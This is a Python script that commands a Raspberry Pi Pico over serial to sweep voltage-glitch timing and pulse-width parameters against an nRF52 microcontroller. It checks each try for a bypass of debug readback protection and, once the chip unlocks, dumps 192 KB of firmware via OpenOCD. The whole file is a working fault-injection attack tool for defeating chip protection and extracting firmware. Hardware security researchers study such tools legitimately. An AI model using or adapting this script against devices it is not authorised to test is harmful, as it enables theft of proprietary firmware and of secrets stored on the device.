"""
Voltage glitch sweep — talks directly to the Pico, no OpenOCD needed.

Usage:
    pip install pyserial
    python glitch_sweep.py --port COM3
    python glitch_sweep.py --port COM3 --dump    # after unlock: dump via OpenOCD
"""

import argparse
import subprocess
import sys
import time

import serial


def send(ser, cmd):
    ser.write((cmd + "\n").encode())
    resp = ser.readline().decode().strip()
    return resp


def is_open(ser):
    return send(ser, "CHECK") == "OPEN"


def dump_firmware(openocd):
    print("Dumping firmware.bin (192 KB)...")
    r = subprocess.run(
        [openocd,
         "-f", "interface/cmsis-dap.cfg",
         "-f", "target/nrf52.cfg",
         "-c", "init; halt; dump_image firmware.bin 0x00000000 196608; exit"],
        capture_output=True, text=True, timeout=30,
    )
    if r.returncode == 0:
        print("Done — firmware.bin written.")
    else:
        print("OpenOCD dump failed:", r.stderr[-300:])


def sweep(ser, offset_range, width_range):
    total = len(offset_range) * len(width_range)
    done = 0
    for offset in offset_range:
        for width in width_range:
            done += 1
            print(
                f"\r[{done:5d}/{total}] offset={offset:4d}µs  width={width:3d}µs  ",
                end="", flush=True,
            )
            send(ser, f"G {offset} {width}")
            time.sleep(0.04)
            if is_open(ser):
                print(f"\n\n*** UNLOCKED  offset={offset}µs  width={width}µs ***")
                return offset, width
    print("\nSweep done — no unlock found.")
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port",         required=True)
    ap.add_argument("--openocd",      default="openocd",
                    help="Only needed with --dump")
    ap.add_argument("--dump",         action="store_true",
                    help="Skip sweep, just dump (use right after successful glitch)")
    ap.add_argument("--offset-min",   type=int, default=1)
    ap.add_argument("--offset-max",   type=int, default=80)
    ap.add_argument("--offset-step",  type=int, default=1)
    ap.add_argument("--width-min",    type=int, default=1)
    ap.add_argument("--width-max",    type=int, default=40)
    ap.add_argument("--width-step",   type=int, default=1)
    args = ap.parse_args()

    print(f"Connecting to Pico on {args.port}...")
    ser = serial.Serial(args.port, 115200, timeout=2)
    time.sleep(2)
    ser.reset_input_buffer()

    if args.dump:
        ser.close()
        dump_firmware(args.openocd)
        return

    offset_range = range(args.offset_min, args.offset_max + 1, args.offset_step)
    width_range  = range(args.width_min,  args.width_max  + 1, args.width_step)
    print(f"Sweeping {len(offset_range) * len(width_range)} combinations...\n")

    result = sweep(ser, offset_range, width_range)
    ser.close()

    if result:
        off, wid = result
        print(f"\nRe-run with these to reproduce:")
        print(f"  --offset-min {off} --offset-max {off} --width-min {wid} --width-max {wid}")
        print(f"\nTo dump now (SWD is open), quickly run:")
        print(f"  python glitch_sweep.py --port {args.port} --dump --openocd <path>")


if __name__ == "__main__":
    main()
